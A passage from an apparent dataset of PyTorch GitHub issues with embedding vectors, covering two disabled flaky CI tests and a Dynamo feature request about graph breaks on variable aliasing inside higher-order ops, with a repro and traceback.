 -2.23511755e-01 -1.40366070e-02 -1.72369778e-01  2.01711893e-01
  2.12432683e-01  6.10935390e-02 -1.56715110e-01 -1.28163964e-01
  4.43628915e-02  1.60924029e-02  2.53721386e-01  9.64888334e-02
 -2.63024837e-01 -6.37061149e-02  5.54018736e-01  2.13795036e-01
 -5.87324053e-02 -2.66281098e-01 -2.50648797e-01 -1.03398308e-01
  2.85810471e-01  6.00290224e-02 -6.61958903e-02 -1.45802140e-01
  2.56462038e-01  3.08562070e-04 -1.65052831e-01  2.00761318e-01
 -2.29049563e-01 -1.82304874e-01  7.96214417e-02 -1.37420192e-01
  3.23634297e-02 -5.70639074e-01  6.48816749e-02 -5.03270477e-02
  2.20061451e-01  4.70303833e-01  1.20103806e-01  2.32080266e-01
  1.03352055e-01 -2.97188032e-02 -8.21353048e-02  1.78655237e-03
  1.29940864e-02 -8.66102055e-03  2.39364028e-01 -1.91746041e-01
  4.85365659e-01 -3.89846377e-02  1.66647524e-01 -6.52108490e-02
 -3.62425923e-01 -1.71866268e-01  1.99429393e-01  2.27766067e-01
 -2.16393322e-01  6.34848140e-03 -6.49854615e-02 -1.12985291e-01
 -6.29449189e-02  1.25647224e-02  5.08930683e-02  1.52601749e-01
  2.20695421e-01  8.29035789e-02  2.00696021e-01  8.94605741e-02
  1.65458083e-01 -2.19398290e-01  1.09951705e-01  1.18137166e-01
 -1.35419771e-01  3.75018679e-02 -5.60088158e-02 -5.20016104e-02
  3.43484998e-01 -6.46280870e-02 -2.85701066e-01  1.73376113e-01
  1.21139467e-01 -4.29846883e-01  7.46484920e-02  3.02032381e-01
 -1.16845869e-01 -2.98348069e-01  3.80507708e-01  9.72494557e-02
  1.18489660e-01 -1.89266890e-01  2.08539456e-01  4.82293814e-02
 -1.32936016e-01  1.39710635e-01  8.12889785e-02 -1.28606111e-01
 -1.97397560e-01 -9.36427265e-02 -2.72659492e-02  6.44699693e-01
 -2.54676819e-01 -1.83049947e-01  7.82892406e-02 -9.08592809e-03
  1.57963991e-01 -1.21949129e-02 -7.35212490e-02  1.24425981e-02
  9.82746035e-02  7.81256258e-02  1.64664850e-01  1.17461190e-01
 -2.77363032e-01 -9.76338461e-02  1.94184408e-02  2.63521168e-02
 -1.05858617e-01 -2.83169627e-01  3.33347544e-02  9.54702944e-02
 -2.33381048e-01  2.84433722e-01 -8.84869993e-02 -2.87951678e-01
  2.52845287e-01  5.06218672e-02 -1.12893708e-01  6.79227039e-02
 -9.51277167e-02  2.34333891e-02 -1.15586072e-03 -1.12641547e-02
  2.01951981e-01  4.54717219e-01  5.92491589e-02 -4.95476127e-02
  3.41830343e-01  1.33687839e-01  1.30702376e-01 -1.39540374e-01
  6.21584291e-03  5.12588382e-01 -2.03097224e-01  9.21056718e-02
  2.23955020e-01 -1.78996935e-01 -5.08008480e-01 -1.49168000e-02
 -3.22538316e-02  1.94432318e-01 -6.10208288e-02 -3.59138735e-02
  1.38235822e-01 -9.52954441e-02 -1.11415442e-02 -1.03997812e-01
  3.16874623e-01 -3.23163599e-01 -1.18654579e-01  1.92552269e-01
  3.09890956e-02 -5.35176247e-02  1.47501722e-01  1.13905124e-01
 -8.48830193e-02  3.01818132e-01  2.14322522e-01 -1.57172561e-01
 -5.81441224e-02 -1.31833404e-01 -6.48427010e-01 -1.61331862e-01
  3.26312520e-02  6.02677315e-02 -1.71678334e-01 -2.60881841e-01
  1.08191743e-03 -2.21173819e-02 -1.41866073e-01  9.98634100e-02
 -3.23121607e-01  3.07072639e-01  2.18933761e-01 -4.27929498e-02
  3.09789870e-02  1.48984358e-01 -3.55582565e-01 -3.26813161e-01
  6.45920783e-02  7.60947466e-02 -2.44425371e-01 -1.68390214e-01
  9.11335275e-03 -1.76166594e-01 -2.04994865e-02  1.39029667e-01
  7.29193836e-02  1.60178885e-01  1.60126034e-02  9.39000025e-02
 -4.13189292e-01  2.14750059e-02 -3.23930919e-01 -1.32887542e-01
 -2.62810230e-01 -8.14651623e-02 -6.47507757e-02  3.11686158e-01
 -1.01376265e-01  3.19890529e-02 -1.39815241e-01 -1.79747209e-01
  1.42800093e-01  6.00053370e-03  2.99227953e-01 -2.94832051e-01
 -1.24723792e-01 -4.42786962e-02 -3.81113403e-03  5.23974180e-01
 -4.52757359e-01 -5.18064678e-01 -1.19242281e-01  1.69360474e-01
 -3.46530825e-02  1.98784932e-01 -5.03122173e-02 -1.93254888e-01
 -2.85542190e-01  1.79643303e-01 -1.43318325e-01 -3.07428062e-01
  4.36439551e-02 -1.03428513e-01  9.92951989e-02  4.51587170e-01
 -1.74906999e-01  1.04292564e-01  1.94456875e-02  4.99825776e-02
 -7.63459951e-02  4.47871923e-01 -1.50256217e-01  3.88513207e-01
  1.97151974e-01  1.25519812e-01 -2.18062878e-01  3.41510922e-02
  4.70946953e-02 -1.26930043e-01  4.81846333e-01 -6.77198887e-01
 -9.49084908e-02  1.68312728e-01  2.15218633e-01 -1.85302645e-01
  3.95237207e-01  2.92836763e-02 -4.66192514e-02 -1.45736784e-01
  1.59973964e-01  7.05670491e-02 -2.93922991e-01 -3.52929458e-02
  2.47714490e-01 -3.33890587e-01  3.59213278e-02 -1.37981355e-01
 -3.57166499e-01  7.63725489e-03 -1.70401141e-01  1.57953471e-01
  1.56989977e-01  8.97698756e-03 -2.96892881e-01  1.14543699e-01
  3.00220549e-01 -2.41622299e-01  1.33349359e-01 -2.26999313e-01
 -3.01403135e-01 -1.23026915e-01  4.10129949e-02 -3.88202906e-01
  8.02152753e-02 -1.13349140e-01  2.77488120e-02 -3.03155482e-02
  4.17465180e-01 -2.53008068e-01  3.80262434e-02  2.73532361e-01
 -2.40499992e-02  1.97688416e-01  1.99298393e-02  7.80227184e-02
 -1.34170786e-01  3.86607319e-01 -1.70629062e-02  1.98619962e-01
  3.43447924e-01 -5.77741452e-02 -3.44661087e-01  1.75860569e-01
  1.50967211e-01  2.95394771e-02 -3.85260642e-01 -4.90925536e-02
 -1.61030784e-01  7.15271235e-02 -2.02959120e-01 -1.43067300e-01
 -1.39005154e-01 -2.53123224e-01  4.80526686e-02 -6.92775995e-02
 -1.65975094e-01  4.80526716e-01  6.27722293e-02 -2.91262150e-01
  1.38338089e-01  2.41726637e-03  1.14864059e-01 -2.37339765e-01
 -1.51913464e-01 -2.74709240e-03  3.04403365e-01  2.41200984e-01
  1.80186123e-01  9.26988386e-03 -1.30737662e-01  8.55910033e-02
 -4.37592089e-01 -1.28767982e-01 -2.07459778e-02  4.08369958e-01
  1.83718443e-01  1.20538220e-01  3.60246688e-01  6.11291707e-01
 -1.32687449e-01 -2.06793249e-01 -3.74801993e-01 -2.92924047e-01
  2.18553960e-01 -4.85961400e-02 -3.42729017e-02  1.02484357e-02
  4.66669500e-02  3.01797956e-01 -4.31116998e-01  1.87115163e-01
 -1.56372517e-01  2.51512796e-01  2.18867183e-01 -6.87045455e-02
  2.34839663e-01 -2.05463409e-01 -9.50370133e-02  2.38451734e-02
 -1.81283951e-01  9.52910781e-02  6.80175275e-02  1.33633643e-01]"
DISABLED test_cond (__main__.MiscTests) triaged module: flaky-tests skipped module: dynamo,"Platforms: linux, slow

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_cond&suite=MiscTests) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/18083697881).

Over the past 3 hours, it has been determined flaky in 2 workflow(s) with 2 failures and 2 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_cond`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `dynamo/test_misc.py`

cc @voznesenskym @penguinwu @EikanWang @jgong5 @Guobing-Chen @XiaobingSuper @zhuhaozhe @blzheng @wenzhe-nrv @jiayisunx @chenyang78 @aakhundov @kadeng",False,"[-2.48045728e-01 -1.45410866e-01 -1.15896642e-01 -5.99533319e-02
  1.16651747e-02 -4.02542710e-01  1.44358724e-01  1.66026175e-01
 -4.57870185e-01 -1.99334323e-01  2.09824622e-01 -1.53950341e-02
  3.00585657e-01 -6.04418814e-02 -2.11226165e-01 -2.79986560e-01
  2.97992490e-04 -2.09945425e-01  2.21593797e-01  3.99048999e-02
 -3.80500197e-01  3.47916521e-02 -2.25023389e-01  2.15345234e-01
 -1.47977043e-02  2.74280366e-02 -1.07063375e-01 -1.26839578e-01
 -2.26505041e-01  1.02179395e-02  3.28206539e-01  3.42125297e-01
 -4.11644965e-01  3.70340273e-02  3.05509627e-01  3.11751664e-01
 -1.36455707e-02 -3.65609467e-01 -1.55264765e-01 -2.75189936e-01
  1.72937680e-02 -1.89785771e-02  1.65745288e-01 -1.93748754e-02
 -1.69718284e-02  1.25845850e-01 -3.16744447e-01  1.62050068e-01
 -2.38599747e-01 -7.06317872e-02  1.92792453e-02 -1.78792700e-02
  2.18702942e-01 -5.45230746e-01  1.69434264e-01 -3.55568290e-01
  2.13744372e-01  3.62444520e-01  4.08281013e-02  1.40883401e-01
 -8.70216936e-02 -2.14872882e-02  6.76863715e-02  1.47265717e-01
 -4.77770865e-02  1.77162401e-02  1.85488984e-01 -1.52856722e-01
  5.78859806e-01  3.28630023e-02  7.71614239e-02  1.24247521e-01
 -4.37472820e-01 -1.32045567e-01  8.89708251e-02  2.44585544e-01
 -1.93658292e-01 -7.23383948e-03  8.90206546e-02 -1.88484013e-01
  7.09838793e-02  1.42141551e-01  1.24029502e-01 -2.32587129e-01
  3.11935365e-01 -1.35133862e-02  1.54740930e-01 -1.58749625e-01
  9.81909856e-02 -2.28968054e-01  4.30801094e-01 -6.37246296e-03
 -7.37468377e-02  1.62284315e-01 -1.73895001e-01  2.42600739e-01
  3.47306967e-01  3.56895849e-03 -3.32297504e-01  1.14351444e-01
  6.47639781e-02 -2.36597240e-01 -1.52257651e-01  2.25217640e-01
 -2.36351669e-01 -2.58068740e-01  4.57763642e-01 -4.41621840e-02
  2.48510152e-01 -1.63951993e-01  9.17468220e-02 -1.80337891e-01
 -1.11804288e-02  9.47952569e-02  9.42698717e-02 -1.77143142e-02
  1.60720274e-02 -1.31808370e-01  4.74422313e-02  3.40027094e-01
 -1.93951815e-01 -1.08541481e-01  2.01208591e-01 -1.15351200e-01
  3.63397658e-01  1.12670109e-01  1.21470913e-01  2.74602175e-02
 -1.04355589e-01 -2.26493478e-01 -5.01896739e-02  5.79833724e-02
 -4.36874062e-01 -7.11847693e-02 -6.35717623e-03  2.14157313e-01
 -1.05837695e-01 -1.86295509e-01  2.68401541e-02  1.30480826e-01
 -2.48611525e-01  1.41412407e-01  1.01099677e-01 -1.46224588e-01
  5.62172160e-02 -1.25278115e-01 -2.96093404e-01  4.77194227e-02
 -2.21900523e-01 -1.07907116e-01  1.72927544e-01 -1.71874445e-02
  1.27058491e-01  4.99534309e-01  6.22433499e-02  1.78014666e-01
  3.46619010e-01  7.92484656e-02  3.30714621e-02 -2.61786938e-01
  2.48896284e-03  5.33381581e-01 -2.75782228e-01  1.43184945e-01
  1.12141080e-01  6.41431659e-02 -5.17342329e-01  6.38146466e-03
 -8.75466019e-02  5.22154644e-02 -1.48942083e-01  6.57349080e-03
  1.85676754e-01 -2.80892313e-01  6.33083433e-02 -1.84344500e-01
  5.31306118e-02 -5.29089291e-03 -4.23548855e-02  4.14194584e-01
 -2.01942660e-02  3.02712023e-01  1.49112895e-01  4.55615282e-01
  5.02210036e-02  2.76805282e-01  2.10488096e-01  7.66509864e-03
 -9.14495066e-02 -6.59118593e-03 -4.51065034e-01 -1.24856316e-01
  1.46736890e-01 -1.52471721e-01 -1.51459798e-01 -2.29394227e-01
  1.32330358e-01  4.14748564e-02  1.96963102e-02  4.63893786e-02
 -2.26385951e-01  3.25835973e-01  2.77369291e-01 -2.00496078e-01
 -2.51355506e-02  1.19933665e-01 -2.54480124e-01 -4.97811079e-01
  3.00224006e-01  6.82211071e-02 -4.22040522e-01  1.76625341e-01
 -6.57728985e-02 -2.87315607e-01 -9.82509926e-02  2.42399305e-01
 -5.27051464e-02 -3.35956037e-01  9.42327380e-02  3.43853116e-01
 -1.22428965e-02 -2.22055495e-01  2.29503624e-02 -2.58037508e-01
 -1.04332991e-01  4.32672948e-02  3.76098137e-03  2.82719016e-01
  1.28703654e-01  8.29741638e-03  1.38387252e-02 -2.46984005e-01
  2.43588239e-01  1.22478306e-01  2.32048750e-01 -1.24187805e-01
 -1.77275330e-01 -1.90089285e-01  2.20054775e-01  2.67498255e-01
 -2.85165340e-01 -5.89785933e-01  5.80055974e-02  1.64953321e-01
  3.02535314e-02  3.09672475e-01 -1.14876539e-01 -2.65836030e-01
 -4.12248433e-01  3.51949036e-02  1.19916759e-02 -4.52834755e-01
 -1.10539749e-01  1.75496951e-01  4.11624670e-01  3.81894708e-01
 -6.02262691e-02  8.60795900e-02  1.35996163e-01 -2.28093609e-01
  2.33123213e-01  4.63193476e-01 -2.35417426e-01  1.12795450e-01
  9.99660194e-02  2.65731514e-01 -1.60515830e-01  1.15497105e-01
 -9.76702794e-02 -8.50874186e-03  2.25541428e-01 -4.22814935e-01
  1.42581820e-01  1.94294631e-01  3.42083275e-01 -3.10391605e-01
  1.41723782e-01 -2.83620004e-02 -1.05768189e-01 -1.47736549e-01
 -5.00055961e-03 -2.09477320e-02 -1.33333415e-01  1.32572502e-01
  2.22302407e-01 -1.59860909e-01 -2.50789046e-01 -2.72423178e-01
 -2.24304527e-01 -1.29329219e-01 -1.61176741e-01  4.30013895e-01
  2.96428859e-01  2.10428052e-02 -1.46139145e-01  2.25043163e-01
  6.86300397e-02 -1.53272480e-01  1.26899004e-01 -1.69308614e-02
 -3.73208135e-01 -4.52983379e-02  9.60431993e-02 -1.03487983e-01
  5.29872812e-02 -1.98497698e-02 -5.07595651e-02  5.30945808e-02
  2.33916342e-01 -3.07117999e-01 -1.41211480e-01  2.72259235e-01
 -5.05760908e-02  4.00831312e-01  9.73078087e-02 -9.31696966e-03
 -1.49613798e-01  4.25847709e-01 -3.41967046e-02  1.54749662e-01
  1.09723359e-01 -3.39092165e-02 -4.07744527e-01  1.58248730e-02
  2.03420967e-01 -1.09383753e-02 -4.39870477e-01  5.82853705e-02
 -2.68770665e-01  1.06094941e-01 -4.71844748e-02 -1.07394494e-01
 -2.08005667e-01 -5.92808351e-02  1.47351138e-02  1.05360664e-01
  1.89136397e-02  3.91439557e-01  4.01218757e-02 -2.34359756e-01
  2.36858740e-01  9.08049047e-02  1.36020362e-01 -2.96764731e-01
 -2.71999776e-01  1.01189166e-02  1.15949705e-01  6.79290667e-02
 -4.19407673e-02 -1.24932662e-01 -2.55231380e-01  1.22704044e-01
 -4.29192066e-01  6.27890527e-02  8.69333521e-02  5.55817723e-01
  1.46010607e-01  1.87473208e-01  3.42449605e-01  2.90709198e-01
 -2.71242946e-01 -1.64516509e-01 -3.64087045e-01 -1.13978058e-01
 -5.07991798e-02 -7.93481767e-02 -8.85859132e-02 -1.74608901e-01
 -6.73886314e-02  2.13750452e-01 -4.33411956e-01  4.27682362e-02
 -8.12574401e-02  2.10298270e-01  3.65044087e-01 -1.50770262e-01
  7.57767707e-02 -2.92962659e-02 -1.07063800e-01  3.17283124e-02
 -2.15501219e-01  2.11891621e-01  1.34690225e-01  3.57687891e-01]"
don't graph break for assignment of mutables in higher order op's function triaged oncall: pt2 module: dynamo,"### ðŸš€ The feature, motivation and pitch

Right now we cannot do a aliasing in the inner function of higher order op, this could be an assignment such as `x = args` or could be a `for arg in args`, the latter would be very useful in supporting pytree.tree_flatten inside the inner function.
```python
import torch
from torch._higher_order_ops.wrap import wrap

@torch.compile(backend=""eager"", fullgraph=True)
def f(args):
    def inner_f(args):
        x = args # assign a tuple to a local var causes graph break
        # for arg in args # is also not allowed.
        return x
    return wrap(inner_f, args)

args = ((torch.ones(1), torch.ones(1)),)
f(args)
```
It produces errors like below:
```
[2023-10-26 09:47:32,794] [0/0] torch._dynamo.variables.higher_order_ops: [WARNING] speculate_subgraph: while introspecting wrap, we were unable to trace function `NestedUserFunctionVariable` into a single graph. This means that Dynamo was unable to prove safety for this API and will fall back to eager-mode PyTorch, which could lead to a slowdown.
[2023-10-26 09:47:32,794] [0/0] torch._dynamo.variables.higher_order_ops: [ERROR] HigherOrderOperator: Mutating a variable not in the current scope (replace_all)
Traceback (most recent call last):
  File ""/home/yidi/local/pytorch/torch/_dynamo/variables/higher_order_ops.py"", line 214, in speculate_subgraph
    output = f.call_function(tx, args, sub_kwargs)
  File ""/home/yidi/local/pytorch/torch/_dynamo/variables/functions.py"", line 90, in call_function
    return tx.inline_user_function_return(
  File ""/home/yidi/local/pytorch/torch/_dynamo/symbolic_convert.py"", line 622, in inline_user_function_return
    result = InliningInstructionTranslator.inline_call(self, fn, args, kwargs)
  File ""/home/yidi/local/pytorch/torch/_dynamo/symbolic_convert.py"", line 2255, in inline_call
    return cls.inline_call_(parent, func, args, kwargs)
  File ""/home/yidi/local/pytorch/torch/_dynamo/symbolic_convert.py"", line 2387, in inline_call_
    tracer.run()
  File ""/home/yidi/local/pytorch/torch/_dynamo/symbolic_convert.py"", line 751, in run
    and self.step()
  File ""/home/yidi/local/pytorch/torch/_dynamo/symbolic_convert.py"", line 714, in step
    getattr(self, inst.opname)(inst)
  File ""/home/yidi/local/pytorch/torch/_dynamo/symbolic_convert.py"", line 816, in STORE_FAST
    loaded_vt = loaded_vt.rename(self, name)
  File ""/home/yidi/local/pytorch/torch/_dynamo/variables/base.py"", line 345, in rename
    return tx.replace_all(self, new_vt)
  File ""/home/yidi/local/pytorch/torch/_dynamo/symbolic_convert.py"", line 2530, in replace_all
    self.check_replace_is_safe(oldvar, newvar)
  File ""/home/yidi/local/pytorch/torch/_dynamo/symbolic_convert.py"", line 2525, in check_replace_is_safe
    unimplemented(
  File ""/home/yidi/local/pytorch/torch/_dynamo/exc.py"", line 184, in unimplemented
    raise Unsupported(msg)
torch._dynamo.exc.Unsupported: HigherOrderOperator: Mutating a variable not in the current scope (replace_all)

The above exception was the direct cause of the following exception:

Traceback (most recent call last):
  File ""/home/yidi/local/pytorch/repro.py"", line 14, in <module>
    f(args)
  File ""/home/yidi/local/pytorch/torch/_dynamo/eval_frame.py"", line 410, in _fn
    return fn(*args, **kwargs)
  File ""/home/yidi/local/pytorch/torch/_dynamo/eval_frame.py"", line 558, in catch_errors
    return callback(frame, cache_entry, hooks, frame_state)
  File ""/home/yidi/local/pytorch/torch/_dynamo/convert_frame.py"", line 148, in _fn
    return fn(*args, **kwargs)
  File ""/home/yidi/local/pytorch/torch/_dynamo/convert_frame.py"", line 402, in _convert_frame_assert
    return _compile(
  File ""/home/yidi/local/pytorch/torch/_dynamo/convert_frame.py"", line 610, in _compile
    guarded_code = compile_inner(code, one_graph, hooks, transform)
  File ""/home/yidi/local/pytorch/torch/_dynamo/utils.py"", line 221, in time_wrapper
    r = func(*args, **kwargs)
  File ""/home/yidi/local/pytorch/torch/_dynamo/convert_frame.py"", line 527, in compile_inner
    out_code = transform_code_object(code, transform)
  File ""/home/yidi/local/pytorch/torch/_dynamo/bytecode_transformation.py"", line 1028, in transform_code_object
    transformations(instructions, code_options)
  File ""/home/yidi/local/pytorch/torch/_dynamo/convert_frame.py"", line 497, in transform
    tracer.run()
  File ""/home/yidi/local/pytorch/torch/_dynamo/symbolic_convert.py"", line 2127, in run
    super().run()
  File ""/home/yidi/local/pytorch/torch/_dynamo/symbolic_convert.py"", line 751, in run
    and self.step()
  File ""/home/yidi/local/pytorch/torch/_dynamo/symbolic_convert.py"", line 714, in step
    getattr(self, inst.opname)(inst)
  File ""/home/yidi/local/pytorch/torch/_dynamo/symbolic_convert.py"", line 405, in wrapper
    return inner_fn(self, inst)
  File ""/home/yidi/local/pytorch/torch/_dynamo/symbolic_convert.py"", line 1147, in CALL_FUNCTION
    self.call_function(fn, args, {})
  File ""/home/yidi/local/pytorch/torch/_dynamo/symbolic_convert.py"", line 586, in call_function
    self.push(fn.call_function(self, args, kwargs))
  File ""/home/yidi/local/pytorch/torch/_dynamo/variables/higher_order_ops.py"", line 1216, in call_function
    p_args, p_kwargs, example_value, treespec = self.create_wrapped_node(
  File ""/home/yidi/local/pytorch/torch/_dynamo/variables/higher_order_ops.py"", line 1176, in create_wrapped_node
    ) = speculate_subgraph(
  File ""/home/yidi/local/pytorch/torch/_dynamo/variables/higher_order_ops.py"", line 288, in speculate_subgraph
    raise Unsupported(
torch._dynamo.exc.Unsupported: speculate_subgraph: while introspecting wrap, we were unable to trace function `NestedUserFunctionVariable` into a single graph. This means that Dynamo was unable to prove safety for this API and will fall back to eager-mode PyTorch, which could lead to a slowdown. Scroll up for the stack trace of the initial exception. The reason was: HigherOrderOperator: Mutating a variable not in the current scope (replace_all)

from user code:
   File ""/home/yidi/local/pytorch/repro.py"", line 10, in f
    return wrap(inner_f, args)

Set TORCH_LOGS=""+dynamo"" and TORCHDYNAMO_VERBOSE=1 for more information


You can suppress this exception and fall back to eager by setting:
    import torch._dynamo
    torch._dynamo.config.suppress_errors = True
```


### Alternatives

_No response_

### Additional context

_No response_

cc @ezyang @msaroufim @wconstab @bdhirsh @anijain2305 @zou3519 @voznesenskym @penguinwu @EikanWang @jgong5 @Guobing-Chen @XiaobingSuper @zhuhaozhe @blzheng @wenzhe-nrv @jiayisunx @chenyang78 @aakhundov @kadeng",False,"[-2.66859561e-01 -7.39643350e-03 -2.71796107e-01 -4.17550579e-02
  2.36632396e-02 -1.22475401e-01  2.08500028e-01  4.74970937e-02
 -4.59044546e-01  6.81689335e-03  1.06258340e-01  7.46780410e-02
 -3.45580801e-02  9.83404443e-02  1.54395208e-01  2.21872091e-01
 -2.31212139e-01  9.47561301e-03 -9.45612341e-02 -2.02213079e-01
  5.12514830e-01  9.00767446e-02  3.09497071e-03 -5.33482283e-02
 -9.35562477e-02  9.73577648e-02 -9.86340791e-02 -1.57473177e-01
  1.59591496e-01 -4.95769083e-04  9.66393724e-02 -5.01730107e-02
 -2.98075289e-01  1.16043165e-01 -1.22991361e-01  1.78345829e-01
 -2.62340754e-01  8.56930166e-02  3.59308571e-02  6.02502301e-02
 -7.10139573e-02  1.22261494e-01 -1.92230940e-02 -1.52948111e-01
 -1.69091672e-01 -2.15339825e-01 -7.99894631e-02 -5.42175174e-02
 -1.01433426e-01 -9.90327671e-02 -2.32170671e-01  2.86326051e-01
 -2.32239544e-01 -2.55671382e-01  1.06495574e-01  8.33619013e-02
 -4.59330045e-02  1.03465647e-01  1.90146253e-01 -3.43514621e-01
 -8.44803900e-02  2.18093414e-02  6.53736144e-02  1.00185394e-01
  1.88804753e-02  1.33297686e-02 -1.80653274e-01  3.50569427e-01
  1.25179633e-01  9.62975621e-03 -4.82466370e-02 -1.76041313e-02
 -3.78210157e-01 -3.24895084e-01 -1.29123434e-01  2.53845066e-01
 -4.19313312e-01 -8.01703334e-02 -2.66418636e-01 -2.37965155e-02
  4.88555320e-02  5.82975708e-02 -1.70601979e-01  2.43329644e-01
  1.12500787e-01 -9.74074006e-04 -1.98283810e-02 -2.72733510e-01
  2.04981491e-01  2.21811622e-01  4.50693160e-01 -4.50075641e-02
  3.47664170e-02  6.00503504e-01  5.82606643e-02  1.87762499e-01
  2.62061954e-01 -5.97522110e-02 -2.87054718e-01 -1.84082493e-01
 -1.48861006e-01 -2.93734908e-01 -3.13060701e-01  1.22811630e-01
  2.11382687e-01 -7.74523169e-02  7.45423809e-02 -4.59964573e-03
  1.45925745e-01 -8.81037861e-03  6.47111088e-02  2.20705401e-02
 -3.54402065e-02  5.62856048e-02  1.54345632e-01  1.25708312e-01
  8.06983709e-02  3.32915597e-02 -8.14042464e-02 -3.29444081e-01
  1.86923757e-01  2.62278557e-01 -5.00381142e-02  5.56954324e-01
  1.09631136e-01  1.00638703e-01  8.42477605e-02 -3.39655951e-02
  9.03163552e-02  6.75506592e-02  2.44271353e-01  1.76313609e-01
  1.10988572e-01 -6.33775070e-02  2.04728425e-01  1.99110866e-01
 -1.76912993e-01  2.38615543e-01 -2.40370050e-01  1.50067151e-01
 -5.14495783e-02 -2.51593649e-01 -4.99928109e-02 -2.25668669e-01
  3.17108065e-01  9.77746174e-02 -2.28841618e-01  9.16961506e-02
 -5.73473126e-02 -2.06760883e-01 -7.18391761e-02 -1.37062714e-01
 -3.38244915e-01  4.10560966e-01  1.28299266e-01  4.68359515e-02
  4.72219363e-02  1.83507234e-01  3.45835358e-01 -1.47524357e-01
  8.30327049e-02  3.28108788e-01  2.02345345e-02  4.08401974e-02
  5.44737428e-02 -5.30614629e-02 -9.06747356e-02 -2.13119715e-01
 -4.49598372e-01  8.78621824e-03 -2.36613929e-01 -9.54175740e-02
 -3.20580244e-01 -3.61117303e-01  2.34503239e-01  1.71489894e-01
 -3.10964257e-01 -2.10528344e-01  1.25359774e-01  3.26415241e-01
  3.44572783e-01  4.75608468e-01  2.04044476e-01  2.32711881e-01
  6.48027062e-02  1.14819318e-01  4.00535166e-01 -7.35646188e-02
  1.24749523e-02  1.41505510e-01 -2.05546319e-01 -4.85755056e-02
  7.47014508e-02  1.24581620e-01  2.49815434e-02 -5.54843917e-02
  3.09362203e-01 -2.97655500e-02 -6.52913898e-02 -8.53278041e-02
 -1.99436516e-01  4.24279645e-02  8.11896548e-02 -8.00316930e-02
 -1.61368042e-01 -2.52952456e-01 -1.93482816e-01 -8.19790661e-02
 -2.79123932e-01  1.09225854e-01 -1.92038387e-01 -3.49982262e-01
 -1.00281183e-03 -9.55886543e-02  2.39711870e-02  2.50239909e-01
 -4.16913554e-02  5.09059355e-02 -2.62980461e-01  4.60951850e-02
  7.67238736e-02  1.47274118e-02  1.21354938e-01 -2.71675348e-01
  1.78624198e-01  3.26123722e-02 -6.82014301e-02 -1.81331068e-01
  1.61853418e-01 -7.51999542e-02  1.32590011e-02 -3.38910162e-01
  2.52886117e-01  1.97470382e-01 -7.74910823e-02  1.07431486e-01
 -6.84892759e-02 -1.41770672e-02  1.67373508e-01 -1.32828020e-02
 -2.75047958e-01  2.28910238e-01 -1.91935688e-01  1.43466778e-02
 -9.23504457e-02  9.16638821e-02 -1.06883362e-01 -6.81062564e-02
 -2.11825341e-01  1.30880460e-01 -1.56104684e-01  1.10513959e-02
  1.55949965e-01  1.82373961e-03  3.33758397e-03  1.93999410e-01
  1.09874085e-03 -2.97277421e-02 -4.19438034e-02  2.66734324e-03
  2.91573573e-02 -1.59265354e-01 -5.19480556e-02  4.82539646e-02
  1.14972681e-01  3.06171868e-02 -1.18731327e-01  3.05166662e-01
  9.52714235e-02 -5.07692695e-02  3.65486480e-02 -1.45997792e-01
  1.34756729e-01  3.07899714e-03 -3.01013254e-02  9.59437788e-02
  3.40610564e-01 -8.44162703e-02  1.52807266e-01  3.08886170e-03
  3.47188003e-02  2.08856195e-01 -1.35757029e-01 -1.21790087e-02
  3.02565813e-01 -2.65336692e-01 -1.00249335e-01 -1.01374239e-01
 -1.17828824e-01 -1.90921769e-01 -7.27652609e-02 -1.97183460e-01
  2.17511773e-01 -2.07584113e-01  6.42916188e-03  2.18413442e-01
  4.98184040e-02 -1.49693847e-01 -7.50621334e-02  9.95615572e-02
 -6.12447560e-02  1.14647500e-01 -1.72779500e-01 -5.55210076e-02
 -1.25674471e-01  1.03158250e-01  1.61081582e-01 -5.64109981e-02
  2.86908537e-01 -2.80518115e-01  2.20543891e-01  3.12266082e-01
 -5.93645163e-02  2.43161410e-01 -1.52107656e-01 -8.11293442e-03
  2.01922730e-02  4.80760306e-01  1.71009287e-01  1.07658759e-01
 -4.97904003e-01 -2.50992596e-01 -1.02114253e-01  3.72876897e-02
 -5.98957464e-02  2.48752296e-01 -2.56917894e-01  2.40544118e-02
 -1.28780454e-01  6.71721697e-02  1.91615880e-01  1.62223905e-01
  3.29103544e-02  2.74384499e-01 -2.01665051e-02 -1.31423727e-01
 -4.63585891e-02  1.40600428e-01 -5.74179143e-02 -5.32785654e-02
 -1.92271188e-01  5.33464067e-02 -1.71898812e-01  1.60049014e-02
 -1.49532095e-01 -2.02847943e-01 -1.33926179e-02  2.29966804e-01
  1.09914886e-02  1.26578510e-02  1.48728013e-01 -2.93026567e-02
  2.52081025e-02  2.29016870e-01  2.23698877e-02  3.43078941e-01
  1.46547034e-01 -7.26967752e-02 -2.08618015e-01  3.43764782e-01
 -5.58254480e-01  9.36073437e-03 -2.81920552e-01 -7.87314177e-02
 -1.15146134e-02  5.33046015e-02 -8.54552686e-02 -2.10007772e-01
  3.07694245e-02  2.25501716e-01 -2.02068970e-01  1.18187107e-02
 -1.36025935e-01  3.59997824e-02  1.08747043e-01  1.25264466e-01
  6.57919049e-02  1.30169779e-01 -8.46912563e-02 -4.13182862e-02
 -6.61922991e-03  1.87704504e-01 -1.67662084e-01 -1.38187468e-01]"
DISABLED test_triton_bsr_scatter_mm_blocksize_16_cuda_float16 (__main__.TestSparseCompressedTritonKernelsCUDA) module: sparse triaged module: flaky-tests skipped,"Platforms: linux, slow

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_triton_bsr_scatter_mm_blocksize_16_cuda_float16&suite=TestSparseCompressedTritonKernelsCUDA) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/18075318735).

Over the past 3 hours, it has been determined flaky in 3 workflow(s) with 3 failures and 3 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
